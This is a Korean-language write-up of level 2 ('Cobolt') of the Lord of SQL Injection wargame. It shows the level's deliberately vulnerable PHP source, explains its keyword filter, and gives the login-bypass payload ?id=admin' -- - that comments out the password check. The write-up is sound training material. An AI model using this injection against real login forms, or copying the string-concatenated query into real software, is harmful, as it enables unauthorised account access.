# Lord of SQL Injection No.2 - Cobolt
## 문제 출제 의도
1. SQL Injection을 통해 원하는 값의 SELECT 가능 여부를 확인. 
## 소스 코드 분석
+ 소스 코드  
Cobolt의 소스코드는 다음과 같다.
  ~~~
  <?php
    include "./config.php"; 
    login_chk();
    dbconnect();
    if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
    if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
    $query = "select id from prob_cobolt where id='{$_GET[id]}' and pw=md5('{$_GET[pw]}')"; 
    echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
    $result = @mysql_fetch_array(mysql_query($query)); 
    if($result['id'] == 'admin') solve("cobolt");
    elseif($result['id']) echo "<h2>Hello {$result['id']}<br>You are not admin :(</h2>"; 
    highlight_file(__FILE__); 
  ?>
  ~~~
+ 소스 코드 분석
  - 금지 문자, 문자열
    - congig.php라는 분리된 파일을 외부에서 불러와 적용시킨다.
    - login_chk(); 로그인 여부를 확인하는 함수라고 추정할 수 있다.
    - dbconnect();라는 함수는 데이터베이스와 연동하는 함수라고 추정 가능하다.
    ~~~
    if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
    if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
    ~~~
    - prob, . , ( , ) 이 받은 id 값에 있으면 No Hack ~_~이 출력된다.
    - prob, . , ( , ) 이 받은 pw 값에 있으면 No Hack ~_~이 출력된다.
    ~~~
     $result = @mysql_fetch_array(mysql_query($query));
    ~~~
    - mysql_fetch_array 인출된 값을 연관배열/숫자형 인덱스 로 저장한다.
    ~~~
    if($result['id'] == 'admin') solve("cobolt");
    elseif($result['id']) echo "<h2>Hello {$result['id']}<br>You are not admin :(</h2>"; 
    ~~~
    - 만약 입력 받은 아이 값이 admin이면 solve("cobolt")를 출력하고 그렇지 않다면 You are not admin을 출력한다.
## 문제 해결
  + 풀이 방법 <hr>  
  **Get**방식으로 값을 입력받기 때문에 URL 다음에 다음과 같이 쿼리 스트링을 추가하면 된다. 
    ~~~
    ?id=admin' -- -
    ~~~
    그러면 결과적으로 쿼리는 
    ~~~
    select id from prob_cobolt where id='admin'-- -' and pw=md5('')
    ~~~
    이 됨으로 $result['id']에 'admin'이 들어가 문제가 해결된다.